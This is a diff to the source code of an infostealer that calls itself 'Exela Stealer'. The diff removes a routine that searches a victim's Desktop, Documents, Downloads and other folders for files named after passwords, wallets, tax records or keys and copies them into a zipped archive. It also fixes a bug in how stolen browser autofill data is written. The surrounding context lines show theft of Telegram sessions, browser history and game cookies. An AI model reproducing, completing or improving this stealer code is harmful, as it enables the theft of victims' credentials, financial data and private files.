@@ -578,38 +578,6 @@ class Main:
                         write_file.write("First, close your telegram\nopen this file path on your computer <%appdata%\\Telegram Desktop\\tdata>.\nDelete all the files here, then copy the stolen files to this folder")
         except:
             pass
-    async def StealCommonFiles(self, toPath:str) -> None:
-        try:
-            full_path = os.path.join(self.Temp, toPath)
-            if os.path.isdir(full_path):
-                try:
-                    shutil.rmtree(full_path)
-                except:
-                    pass
-            os.mkdir(full_path)
-            dirs = {
-                "Desktop": f'{os.path.join(os.getenv("userprofile"), "Desktop")}',
-                "Desktop2": f'{os.path.join(os.getenv("userprofile"),"OneDrive", "Desktop")}',
-                "Pictures": f'{os.path.join(os.getenv("userprofile"), "Pictures")}',
-                "Documents": f'{os.path.join(os.getenv("userprofile"), "Documents")}',
-                "Music": f'{os.path.join(os.getenv("userprofile"), "Music")}',
-                "Videos": os.path.join(os.getenv("userprofile"), "Videos"),
-                "Downloads": f'{os.path.join(os.getenv("userprofile"), "Downloads")}'}
-            extantions = (".txt", ".doc", ".docx", ".png", ".pdf", ".jpg", ".jpeg", ".csv", ".mp3", ".mp4", ".xls", ".xlsx")
-            names = ("secret", "password", "account", "tax", "key", "wallet", "backup")
-            for name, paths in dirs.items():
-                if os.path.exists(paths):
-                    # list all files, dirs,subfolders etc...
-                    for root, folders, files in os.walk(paths):
-                        for file in files:
-                            file_path = os.path.join(root, file)
-                            if (any([x in file_path.lower() for x in names]) or file_path.endswith(extantions) and os.path.getsize(file_path) < 2 * 1024 * 1024):
-                                os.makedirs(os.path.join(full_path, name), exist_ok=True)
-                                try:
-                                    shutil.copy(file_path, os.path.join(full_path, name, file))
-                                except:continue   
-        except:
-            pass
     async def RiotGamesSession(self, cookie, browser:str) -> None:
         try:
             connector = aiohttp.TCPConnector(ssl=True)  
@@ -1691,10 +1659,10 @@ class Main:
                     file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                     for historys in history_list:
                         file.write(historys)
-            if download_list:
+            if autofill_list:
                 with open(os.path.join(filePath, "Browsers", "Autofills.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for autofill in download_list:
+                    for autofill in autofill_list:
                         file.write(autofill)
             if bookmark_list:
                 with open(os.path.join(filePath, "Browsers", "Bookmarks.txt"), "a", encoding="utf-8", errors="ignore") as file:
@@ -1869,7 +1837,6 @@ class Main:
         output_lines = stdout.decode(errors="ignore").split("\n")
         uuid = output_lines[1].strip() if len(output_lines) > 1 else "NONE"
         filePath:str = os.path.join(self.Temp, uuid)
-        await self.StealCommonFiles(os.path.join(uuid, "CommonFiles"))
         shutil.make_archive(filePath, "zip", filePath)
         embed_data = {
             "title": "***Exela Stealer***",
